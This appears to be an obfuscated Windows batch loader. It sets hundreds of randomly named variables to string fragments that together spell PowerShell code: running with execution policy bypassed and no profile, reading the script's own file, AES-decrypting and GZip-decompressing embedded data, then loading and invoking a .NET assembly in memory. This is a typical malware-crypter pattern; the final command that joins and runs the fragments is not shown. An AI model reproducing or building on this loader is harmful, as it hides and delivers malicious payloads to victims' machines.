@echo off
set "SKwiEUHnHa=ress"
set "QNWrgQrrQJ=ionM"
set "opZuytXxmW=New-"
set "ELbOrXDrKR=[-1."
set "ncWXXxuhTW=.Cop"
set "FRUPMMmPDK=)))"
set "IZjbgEaVTV=trea"
set "EAPevmynrj=orF'"
set "ojrEtpILsY=ing("
set "VsrgAaEcMb=jk, "
set "qbGKaQDPdl='txe"
set "qmaPJTWrPp= if "
set "jyHXATvOba=gcR."
set "uEsyZowdOd=sGUc"
set "bPclKdnXzU=stem"
set "MrWwNmNofX=g = "
set "bWrLCgJtsZ=hy.A"
set "xRHGNrXNtC=6] -"
set "qoSRGWclCo=e]::"
set "bnExFsAFiw=lBlo"
set "DeMkclZBcY=pres"
set "TzNSgmANcy=Te);"
set "GYHdiazLon=-nop"
set "tqrVMEQlfy=v4Ir"
set "OnjsbgrZgT=nirt"
set "iNZpAZtbuv=Comp"
set "PNPmphxAkG=$cUX"
set "mJOjcBsBZy=.Mem"
set "qBQKtHLCfE=.Sec"
set "cwKrNAjOdS=Zn ="
set "nOvQLmAvgr=m.IO"
set "BORRqmKvtL==');"
set "gHarypuSko=XuWY"
set "lsnOMQyJHt=('%*'"
set "VhgdGfcyOD=ose("
set "uTjkvtPeRX=pose"
set "QxSnzrkPqT=($xH"
set "mjmzugmAtc='')("
set "inNGMjtfgz=vert"
set "wfwLuEHyUf=();$"
set "jtKvWzbCjq=bjec"
set "NrKTZHkear=ose("
set "odWluOCXeN=);$h"
set "rcHAuaVVLT=ddin"
set "HECOXErQKO=]::("
set "wnllqxDBts=tryP"
set "BepalfDxDk=ach "
set "thfbKWXGix=ptor"
set "txWjkjVvrS=y.Pa"
set "lNUOMWPTKb=ct S"
set "nFZDSMcmcz=0O+g"
set "BYbkdBBPwn=('l0"
set "nxihcSkTtR=S46e"
set "soFHzcdDUI=ion."
set "ASKRbDjxiR=3HWs"
set "UFBAwSANGO=yste"
set "DkONdUpUxW= = $"
set "HpvfpjgjGh=eo.I"
set "zIBiRkyiHl=e, 0"
set "lecpZGaRzA=ypto"
set "uxfTHZkihs=stem"
set "UjuJuMiRLZ=fdeo"
set "fgdoUCJEAv=ZmTe"
set "pkPGKchDDT=ispo"
set "samYSMJruR=[Env"
set "SkJEnIcflN=  $h"
set "MTzSMHaNNv=Invo"
set "LOyosmsLCh=tem."
set "gSuRlMEscf=ZYYc"
set "qtgfxHrsQU=ZmTe"
set "QBcyQQxNLz=Obje"
set "pchugYPMTy=oArr"
set "cFcpSfKgHE=ode]"
set "VfeArwOMrc=('%~f0'"
set "ocARBPJyBZ=ne);"
set "TwhSFxxodh=ddin"
set "YIIYtPMyva=OyzA"
set "NCDuXpzgUk=le  "
set "NhEFCxPyOI=:: '"
set "tivjFrdLyo='[-1"
set "CUySkaadSC=$fZm"
set "XOuryerLiW=BC;$"
set "ibZqKnYOXr=daeR"
set "HtAtMKAwVP= [Sy"
set "gMruNUrPXI=.Cry"
set "rxYxMnHGDk== [S"
set "snioLQFgOG=brea"
set "hqYsHkLdtZ=.Cry"
set "gvIpmsEwId='gni"
set "AaKaeVhVJj=onve"
set "QmIJwqOrwO=xbF "
set "kqhvWMxsfA=.Len"
set "lwAQbhWbdb= '')"
set "ExTasfbAxw=UXQA"
set "ELjTIErrBO=($xH"
set "cuaLZdutIB=ke($"
set "aBZQZjGeWx=em.I"
set "mxnoLsFxUl=.-16"
set "mYtibWrsIT=eam("
set "zCFSdNROTs=tem."
set "kzlXhBiIHI=Secu"
set "OctNgwbxwI=New-"
set "ccWwWHokwS=Disp"
set "jhtztMFyut=Bmor"
set "QqNjZXNLKA=ecry"
set "BsRdDutXnY=comm"
set "QyxyXnQGMt=..-1"
set "rWDBSvRHjK=comp"
set "JarNwxJQkp=-ep "
set "jYHzQWhSgP=hfde"
set "RPhaWrJTEq=esFX"
set "dSYTjmdieZ=ewLi"
set "dvGFbTBFhp= New"
set "BUIlaPiwgO=WzM."
set "pzFTxpUdbC=isfL"
set "yFCStQCAYc=();$"
set "odgGAVCLbX=fdeo"
set "BbfXmJrSKx=..-1"
set "ZEyuTkVJiv=);$c"
set "uZAXKrGzeX=ck($"
set "nDqUjsCBkB= = ["
set "OfnIGsEnnp=;$xL"
set "DbJdEdqqon=[Sys"
set "LCaRBzMWfi=tsWi"
set "UiBBGJfjWs=[]] "
set "QFuIyLYOEe=oryS"
set "sDPmDGFsAl=ert]"
set "BmkPElsIGu=k; }"
set "BsTSCPKVhT=;$eP"
set "uhoDnxaEsy=[IO."
set "yEGDtRFzEG=embl"
set "MKHCHSXgxY=pose"
set "ClIltyDbLX=join"
set "AFSmiLlTxP=::De"
set "WGzziVNDkl=fdeo"
set "hDPDCRmyzy=grap"
set "ZuhFdfIVeK=-Obj"
set "SQVtwPLikD=::('"
set "pFTTKxuHqA=Stre"
set "IJpxfsbjfy=)($f"
set "rkRxstqzLS=y.Cr"
set "yUssJgeXZg=$hfd"
set "OspQPHSbfU=, (,"
set "yKQSfgGUcL=am;$"
set "tyJKfFXjCm=ejk."
set "EkxDPFNAiN=V = "
set "lRFCldcetW=Mode"
set "DEZOzMdzqR=.Cre"
set "CoDZQrFOEA=morF"
set "umMHDmzeVx=zM.T"
set "nbXbHcmxWq=gnir"
set "uYuNxOEdLW=ptog"
set "zTOZcdgbAP=Secu"
set "jrhigjrsOF=$aTe"
set "xNanqrkhGa=-joi"
set "GBMkUhZmLM=tS46"
set "oXMrGePamr=7;$h"
set "HsdOaUpgqL=[Sys"
set "YBTDBDYupd=BJNk"
set "OXiLROxVXw= [st"
set "NhVKfZkfHp=Star"
set "CVTpWeQiiR=File"
set "avXbdxMNUT= = N"
set "EhIpbqLKDW=ay()"
set "UVgYUNsjvn=tion"
set "IiwQrpoCEd=oL'["
set "ZBUhGobqaN=1] -"
set "ljyRfTYZfh=pDZz"
set "TiLSFLGggL=PKCS"
set "oyxyseungS=ss -"
set "fMdGwvLgHD=fore"
set "mGCqWcOQLx=.Dis"
set "JoixOKuSNG= = $"
set "ShIpRWlehF=PgcR"
set "kwpHDglHXV=n ''"
set "rzEZXjhkyM=fZmT"
set "FuIzpNIdMQ=] -j"
set "LjVzhMJWin=and "
set "XhHbgnQQPC=fZmT"
set "kUWBAdRfcC= '')"
set "ZsPPyBszUL=e = "
set "fhQGyfQNuS=rans"
set "AVZGhMGhlm=Fina"
set "ayhvGcmvHV=rtS4"
set "QpGcEDouSP=flec"
set "RHdLjJLgZt=ress"
set "qgKZAeDYqG= [Sy"
set "AXuIkBeTKc== $h"
set "DFCwTeFEDI=ptog"
set "kkbWqkBRcC=k = "
set "NoGBMjTxkC=raph"
set "xfDSyKPcZZ=m.Re"
set "AhKJktExGc=+hAO"
set "ERCKjELrVK=[Sys"
set "toynCzhkeE=m(, "
set "BuOMfkhqRB=oint"
set "qZcueHNrED=stem"
set "GZlqooFvPq=esaB"
set "WeeQzsbJmd=th('"
set "GvJMNBFzUi===')"
set "NHuzidNRml=null"
set "hrYqdnoYCo=iron"
set "IyAFHxXuea=ateD"
set "ZUsFpbzweB=WYR "
set "GyqTqBvkIC=.Com"
set "jsLZfeHKoC=pher"
set "fpSdAAucWP=, $f"
set "AEhdmJzDHP=]::("
set "KjhhHRvjkI=rity"
set "vuMtvwpHjV=.GZi"
set "HckKsmENTe=ress"
set "XIUXqBoipg='[-1"
set "fAOmgoxODd=Conv"
set "ZqIiHAttSK=rity"
set "dEkNHxfauu=ew-O"
set "kVQNNowFEV=n) {"
set "oHkfcGhLRa=6esa"
set "zIFsqWKiHE=rt]:"
set "XNJCMJcHwj=BJNk"
set "hbZkPvsSqC=Syst"
set "BqYkmhAEpn=$fZm"
set "vpVFARWfgk=cD.T"
set "MvyQSAlDvd=e = "
set "XCrNxTGWnO=ment"
set "fWYqMfiXYb=Comp"
set "vsdoBVjymn=;$xL"
set "EYmJdzEPWC=TllA"
set "rFGMiUkfYs=('da"
set "izifhlmHNC=cUXQ"
set "zcfznezaKJ=ring"
set "mBYcvfPdbl=Syst"
set "owaVDyaRmg=n ''"
set "IXUtmReneO=.Mod"
set "NPKDJCZEYL=y]::"
set "uLyNKxrHgF=:('g"
set "RORMnVeptC=join"
set "ydGnDGUazV=form"
set "WlMPzNsJwF=aTej"
set "XMctZvijfi=UGTu"
set "llVqiHUPhf=snoZ"
